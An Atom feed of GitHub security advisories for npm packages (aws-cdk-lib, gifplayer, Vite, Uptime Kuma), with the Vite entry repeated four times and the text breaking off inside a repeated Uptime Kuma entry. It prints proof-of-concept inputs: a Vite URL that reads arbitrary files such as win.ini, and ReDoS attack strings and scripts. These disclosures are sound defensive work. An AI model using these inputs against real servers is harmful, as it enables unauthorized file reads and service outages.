<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-04-01T11:01:22.219Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[aws-cdk-lib] aws-cdk-lib has Insertion of Sensitive Information into Log File vulnerability when using Cognito UserPoolClient Construct]]></title>
        <id>https://github.com/advisories/GHSA-qq4x-c6h6-rfxh</id>
        <link href="https://github.com/advisories/GHSA-qq4x-c6h6-rfxh"/>
        <updated>2025-03-31T22:37:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://aws.amazon.com/cdk/">AWS Cloud Development Kit (CDK)</a> is an open-source framework for defining cloud infrastructure using code. Customers use it to create their own applications which are converted to AWS CloudFormation templates during deployment to a customer’s AWS account. CDK contains pre-built components called "<a href="https://docs.aws.amazon.com/cdk/v2/guide/constructs.html">constructs</a>" that are higher-level abstractions providing defaults and best practices. This approach enables developers to use familiar programming languages to define complex cloud infrastructure more efficiently than writing raw CloudFormation templates.</p>
<p>The CDK <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_cognito.UserPool.html">Cognito UserPool</a> construct deploys an AWS cognito user pool. An <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools.html">Amazon Cognito user pool</a> is a user directory for web and mobile app authentication and authorization. Customers can deploy a client under this user pool through construct ‘<a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_cognito.UserPoolClient.html">UserPoolClient</a>’ or through helper method '<a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_cognito.UserPool.html#addwbrclientid-options">addClient</a>'. A user pool client resource represents an Amazon <a href="https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-client-apps.html">Cognito user pool client</a> which is a configuration within a user pool that interacts with one mobile or web application authenticating with Amazon Cognito. </p>
<p>When users of the 'cognito.UserPoolClient' construct generate a secret value for the application client in AWS CDK, they can then reference the generated secrets in their stack. The CDK had an issue where, when the custom resource performed an SDK API call to 'DescribeCognitoUserPoolClient' to retrieve the generated secret, the full response was logged in the associated lambda function's log group. Any user authenticated in the account where logs of the custom resource are accessible and who has read-only permission could view the secret written to those logs. </p>
<p>This issue does not affect customers who are generating the secret value outside of the CDK as the secret is not referenced or logged.</p>
<h3 id="impact">Impact</h3>
<p>To leverage this issue, an actor has to be authenticated in the account where logs of the custom resource Custom::DescribeCognitoUserPoolClient are accessible and have read-only permission for lambda function logs. </p>
<p>Users can review access to their log group through AWS CloudTrail logs to detect any unexpected access to read the logs.</p>
<p><strong>Impacted versions: &gt;2.37.0 and &lt;=2.187.0</strong></p>
<h3 id="patches">Patches</h3>
<p>The patches are included in the AWS CDK Library release v2.187.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes. To fully address this issue, users should rotate the secret by generating a new secret stored in AWS Secrets Manager. References to the secret will use the new secret on update. </p>
<p>When new CDK applications using the latest version are initialized, they will use the new behavior with updated logging. </p>
<p>Existing applications must upgrade to the latest version, change the <a href="https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/cx-api/FEATURE_FLAGS.md">feature flag</a> (@aws-cdk/cognito:logUserPoolClientSecretValue) to false, redeploy the application to apply this fix and use the new implementation with updated logging behavior.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users can override the implementation changing Logging to be Logging.withDataHidden(). For example define class CustomUserPoolClient extends UserPoolClient and&nbsp; in the new class define get userPoolClientSecret() to use Logging.withDataHidden().</p>
<p>Example</p>
<pre><code>export class CustomUserPoolClient extends UserPoolClient {

  private readonly customUserPool : UserPool;
  private readonly customuserPoolClientId : string;
  constructor(scope: Construct, id: string, props: UserPoolClientProps) {
    super(scope, id, props);

    this.customUserPool = new UserPool(this, 'pool', {
      removalPolicy: RemovalPolicy.DESTROY,
    });

    const client = this.customUserPool.addClient('client', { generateSecret: true });
  }



  // Override the userPoolClientSecret getter to always return the secret
  public get userPoolClientSecret(): SecretValue {
    // Create the Custom Resource that assists in resolving the User Pool Client secret
    const secretValue = SecretValue.resourceAttribute(new AwsCustomResource(
      this,
      'DescribeCognitoUserPoolClient',
      {
    resourceType: 'Custom::DescribeCognitoUserPoolClient',
    onUpdate: {
      region: cdk.Stack.of(this).region,
      service: 'CognitoIdentityServiceProvider',
      action: 'describeUserPoolClient',
      parameters: {
        UserPoolId: this.customUserPool.userPoolId,
        ClientId: this.customUserPool,
      },
      physicalResourceId: PhysicalResourceId.of(this.userPoolClientId),
      // Disable logging of sensitive data
      logging: Logging.withDataHidden(),
    },
    policy: AwsCustomResourcePolicy.fromSdkCalls({
      resources: [this.customUserPool.userPoolArn],
    }),
    installLatestAwsSdk: false,
      },
    ).getResponseField('UserPoolClient.ClientSecret'));
    
    return secretValue;
  }
}
</code></pre>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory please contact AWS/Amazon Security via our <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/aws-cdk/security/advisories/GHSA-qq4x-c6h6-rfxh">https://github.com/aws/aws-cdk/security/advisories/GHSA-qq4x-c6h6-rfxh</a></li>
<li><a href="https://github.com/aws/aws-cdk/commit/d02e64aac18a72195ddcdb973defea7f32382c33">https://github.com/aws/aws-cdk/commit/d02e64aac18a72195ddcdb973defea7f32382c33</a></li>
<li><a href="https://github.com/advisories/GHSA-qq4x-c6h6-rfxh">https://github.com/advisories/GHSA-qq4x-c6h6-rfxh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qq4x-c6h6-rfxh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T22:37:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gifplayer] gifplayer XSS vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-gr7w-hmch-25g7</id>
        <link href="https://github.com/advisories/GHSA-gr7w-hmch-25g7"/>
        <updated>2025-03-31T22:36:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>XSS vulnerability. All versions under 0.3.7 are impacted</p>
<h3 id="patches">Patches</h3>
<p>Please upgrade to 0.3.7</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rubentd/gifplayer/security/advisories/GHSA-gr7w-hmch-25g7">https://github.com/rubentd/gifplayer/security/advisories/GHSA-gr7w-hmch-25g7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31128">https://nvd.nist.gov/vuln/detail/CVE-2025-31128</a></li>
<li><a href="https://github.com/rubentd/gifplayer/commit/2966193d4d066e5a6ba09dbdf1e1c7f8238630c8">https://github.com/rubentd/gifplayer/commit/2966193d4d066e5a6ba09dbdf1e1c7f8238630c8</a></li>
<li><a href="https://github.com/advisories/GHSA-gr7w-hmch-25g7">https://github.com/advisories/GHSA-gr7w-hmch-25g7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gr7w-hmch-25g7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T22:36:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite has a `server.fs.deny` bypassed for `inline` and `raw` with `?import` query]]></title>
        <id>https://github.com/advisories/GHSA-4r4m-qw57-chr8</id>
        <link href="https://github.com/advisories/GHSA-4r4m-qw57-chr8"/>
        <updated>2025-03-31T23:32:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The contents of arbitrary files can be returned to the browser.</p>
<h3 id="impact">Impact</h3>
<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href="https://vitejs.dev/config/server-options.html#server-host"><code>server.host</code> config option</a>) are affected.</p>
<h3 id="details">Details</h3>
<ul>
<li>base64 encoded content of non-allowed files is exposed using <code>?inline&amp;import</code> (originally reported as <code>?import&amp;?inline=1.wasm?init</code>)</li>
<li>content of non-allowed files is exposed using <code>?raw?import</code></li>
</ul>
<p><code>/@fs/</code> isn't needed to reproduce the issue for files inside the project root.</p>
<h3 id="poc">PoC</h3>
<p>Original report (check details above for simplified cases):</p>
<p>The ?import&amp;?inline=1.wasm?init ending allows attackers to read arbitrary files and returns the file content if it exists.  Base64 decoding needs to be performed twice</p>
<pre><code>$ npm create vite@latest
$ cd vite-project/
$ npm install
$ npm run dev
</code></pre>
<p>Example full URL <code>http://localhost:5173/@fs/C:/windows/win.ini?import&amp;?inline=1.wasm?init</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8">https://github.com/vitejs/vite/security/advisories/GHSA-4r4m-qw57-chr8</a></li>
<li><a href="https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949">https://github.com/vitejs/vite/commit/59673137c45ac2bcfad1170d954347c1a17ab949</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31125">https://nvd.nist.gov/vuln/detail/CVE-2025-31125</a></li>
<li><a href="https://github.com/advisories/GHSA-4r4m-qw57-chr8">https://github.com/advisories/GHSA-4r4m-qw57-chr8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r4m-qw57-chr8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:31:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] Uptime Kuma's Regular Expression in pushdeeer and whapi file Leads to ReDoS Vulnerability Due to Catastrophic Backtracking]]></title>
        <id>https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</id>
        <link href="https://github.com/advisories/GHSA-hx7h-9vf7-5xhg"/>
        <updated>2025-03-31T16:12:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a <code>ReDoS vulnerability risk</code> in the system, specifically when administrators create <code>notification</code> through the web service(<code>pushdeer</code> and <code>whapi</code>). If a string is provided that triggers catastrophic backtracking in the regular expression, it may lead to a ReDoS attack.</p>
<h3 id="details">Details</h3>
<p>The regular expression<code> \/*$\</code> is used to match zero or more slashes <code>/</code> at the end of a URL. When a malicious attack string appends a large number of slashes <code>/</code> and a non-slash character at the end of the URL, the regular expression enters a backtracking matching process. During this process, the regular expression engine starts checking each slash from the first one, continuing until it encounters the last non-slash character. Due to the greedy matching nature of the regular expression, this process repeats itself, with each backtrack checking the next slash until the last slash is checked. This backtracking process consumes significant CPU resources.</p>
<pre><code class="language-js">.replace(/\/*$/, "")
</code></pre>
<p>For the regular expression <code>/\/*$/</code>, an attack string like </p>
<pre><code class="language-javascript">"https://e" + "/".repeat(100000) + "@" 
</code></pre>
<p>can trigger catastrophic backtracking, causing the web service to freeze and potentially leading to a ReDoS attack.</p>
<blockquote>
<p>When entered from the web interface, the attack string needs to expand <code>"/".repeat(100000)</code> and be input directly, such as <code>https://e/////////..//@</code>. This triggers catastrophic backtracking, leading to web service lag and posing a potential ReDoS attack risk.</p>
</blockquote>
<h3 id="poc">PoC</h3>
<p>The poc.js is in: 
<a href="https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a>
The time lag phenomenon can be observed through test-pushdeer-ReDos, which helps verify the presence of the ReDoS attack:</p>
<pre><code class="language-javascript">const semver = require("semver");
let test;
const nodeVersion = process.versions.node;
if (semver.satisfies(nodeVersion, "&gt;= 18")) {
    test = require("node:test");
} else {
    test = require("test");
}
const PushDeer = require("../../server/notification-providers/pushdeer.js");

const assert = require("node:assert");

test("Test ReDos - attack string", async (t) =&gt; {
    const pushDeer = new PushDeer();
    const notification = {
        pushdeerServer: "https://e" + "/".repeat(100000) + "@",
    };
    const msg = "Test Attacking";
    const startTime = performance.now();
    try {
        pushDeer.send(notification, msg)
    } catch (error) {
    // pass
    }
    const endTime = performance.now();
    const elapsedTime = endTime - startTime;
    const reDosThreshold = 2000;
    assert(elapsedTime &lt;= reDosThreshold, `🚨 Potential ReDoS Attack! send method took ${elapsedTime.toFixed(2)} ms, exceeding threshold of ${reDosThreshold} ms.`);
});
</code></pre>
<blockquote>
<p>Move the <code>test-uptime-calculator.js</code> file to the <code>./uptime-kuma/test/backend-test</code> folder and run <code>npm run test-backend</code> to execute the backend tests.</p>
</blockquote>
<p>Trigger conditions for whapi jams, In the send function within the <code>uptime-kuma\server\notification-providers\pushdeer.js</code> file:
<a href="https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></p>
<pre><code class="language-js">// The attack string "httpS://example" + "/".repeat(100000) + "@"
// poc.js
// Import the target file
const Whapi = require("./uptime-kuma/server/notification-providers/whapi");

// Create an instance of Whapi
const whapi = new Whapi();

const notification = {
    whapiApiUrl: "https://e" + "/".repeat(100000) + "@",
};
// console.log(`${notification.whapiApiUrl}`);
// Define the message to be sent
const msg = "Test Attacking";

// Call the send method and handle exceptions
whapi.send(notification, msg)

// 1-5 are the original installation methods for the project
// 6-8 are attack methods
// ---
// 1.run `git clone https://github.com/louislam/uptime-kuma.git`
// 2.run `cd uptime-kuma`
// 3.run `npm run setup`
// 4.run `npm install pm2 -g &amp;&amp; pm2 install pm2-logrotate`
// 5.run `pm2 start server/server.js --name uptime-kuma`
// ---
// 6.Run npm install in the root directory of the same level as `README.md`
// 7.Move `poc.js` to the root directory of the same level as `README.md`
// 8.and then run `node poc.js`
</code></pre>
<p>After running, a noticeable lag can be observed, with the regular expression matching time increasing from a few milliseconds to over 2000 milliseconds.
<img src="https://github.com/user-attachments/assets/98f18fee-7555-410e-98c8-763906843812" alt="redos" width="760"></p>
<p>You can also perform this attack on the web interface. By timing the operation, it can be observed that the lag still occurs. The key to the attack string is appending a large number of <code>/</code> to the URL, followed by a <code>non-/</code> character at the end, entered directly.</p>
<img src="https://github.com/user-attachments/assets/61945200-4397-4933-9170-2a5517613408" alt="1" width="1280">
<img src="https://github.com/user-attachments/assets/c0d7e952-0ec1-4c54-ba31-8b7144c04669" alt="webserver" width="1280">

<h3 id="impact">Impact</h3>
<p><strong>What kind of vulnerability is it?</strong></p>
<p>This is a <code>Regular Expression Denial of Service (ReDoS)</code> vulnerability. ReDoS exploits poorly designed regular expressions that can lead to excessive backtracking under certain input conditions, causing the affected application to consume high CPU and memory resources. This can result in <code>significant performance degradation or complete service unavailability</code>, especially when processing specially crafted attack strings.</p>
<p><strong>Who is impacted?</strong></p>
<ol>
<li><p><strong>Uptime Kuma users</strong>:
Any users or administrators running the Uptime Kuma project are potentially affected, especially if they allow untrusted input through the web interface or notification services like <code>pushdeer.js</code> and <code>whapi.js</code>. Attackers can exploit this vulnerability by injecting crafted strings into the input fields.</p>
</li>
<li><p><strong>Web services and hosting providers</strong>:
If Uptime Kuma is deployed in a production environment, the vulnerability could impact hosting providers or servers running the application, leading to <code>downtime</code>, <code>degraded performance</code>, or <code>resource exhaustion</code>.</p>
</li>
</ol>
<h3 id="solution">Solution</h3>
<p>@louislam I have provided a solution for you to check:<a href="https://github.com/louislam/uptime-kuma/pull/5573">https://github.com/louislam/uptime-kuma/pull/5573</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/pull/5573">https://github.com/louislam/uptime-kuma/pull/5573</a></li>
<li><a href="https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a></li>
<li><a href="https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></li>
<li><a href="https://github.com/advisories/GHSA-hx7h-9vf7-5xhg">https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T16:12:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] Uptime Kuma's Regular Expression in pushdeeer and whapi file Leads to ReDoS Vulnerability Due to Catastrophic Backtracking]]></title>
        <id>https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</id>
        <link href="https://github.com/advisories/GHSA-hx7h-9vf7-5xhg"/>
        <updated>2025-03-31T16:12:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a <code>ReDoS vulnerability risk</code> in the system, specifically when administrators create <code>notification</code> through the web service(<code>pushdeer</code> and <code>whapi</code>). If a string is provided that triggers catastrophic backtracking in the regular expression, it may lead to a ReDoS attack.</p>
<h3 id="details">Details</h3>
<p>The regular expression<code> \/*$\</code> is used to match zero or more slashes <code>/</code> at the end of a URL. When a malicious attack string appends a large number of slashes <code>/</code> and a non-slash character at the end of the URL, the regular expression enters a backtracking matching process. During this process, the regular expression engine starts checking each slash from the first one, continuing until it encounters the last non-slash character. Due to the greedy matching nature of the regular expression, this process repeats itself, with each backtrack checking the next slash until the last slash is checked. This backtracking process consumes significant CPU resources.</p>
<pre><code class="language-js">.replace(/\/*$/, "")
</code></pre>
<p>For the regular expression <code>/\/*$/</code>, an attack string like </p>
<pre><code class="language-javascript">"https://e" + "/".repeat(100000) + "@" 
</code></pre>
<p>can trigger catastrophic backtracking, causing the web service to freeze and potentially leading to a ReDoS attack.</p>
<blockquote>
<p>When entered from the web interface, the attack string needs to expand <code>"/".repeat(100000)</code> and be input directly, such as <code>https://e/////////..//@</code>. This triggers catastrophic backtracking, leading to web service lag and posing a potential ReDoS attack risk.</p>
</blockquote>
<h3 id="poc">PoC</h3>
<p>The poc.js is in: 
<a href="https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a>
The time lag phenomenon can be observed through test-pushdeer-ReDos, which helps verify the presence of the ReDoS attack:</p>
<pre><code class="language-javascript">const semver = require("semver");
let test;
const nodeVersion = process.versions.node;
if (semver.satisfies(nodeVersion, "&gt;= 18")) {
    test = require("node:test");
} else {
    test = require("test");
}
const PushDeer = require("../../server/notification-providers/pushdeer.js");

const assert = require("node:assert");

test("Test ReDos - attack string", async (t) =&gt; {
    const pushDeer = new PushDeer();
    const notification = {
        pushdeerServer: "https://e" + "/".repeat(100000) + "@",
    };
    const msg = "Test Attacking";
    const startTime = performance.now();
    try {
        pushDeer.send(notification, msg)
    } catch (error) {
    // pass
    }
    const endTime = performance.now();
    const elapsedTime = endTime - startTime;
    const reDosThreshold = 2000;
    assert(elapsedTime &lt;= reDosThreshold, `🚨 Potential ReDoS Attack! send method took ${elapsedTime.toFixed(2)} ms, exceeding threshold of ${reDosThreshold} ms.`);
});
</code></pre>
<blockquote>
<p>Move the <code>test-uptime-calculator.js</code> file to the <code>./uptime-kuma/test/backend-test</code> folder and run <code>npm run test-backend</code> to execute the backend tests.</p>
</blockquote>
<p>Trigger conditions for whapi jams, In the send function within the <code>uptime-kuma\server\notification-providers\pushdeer.js</code> file:
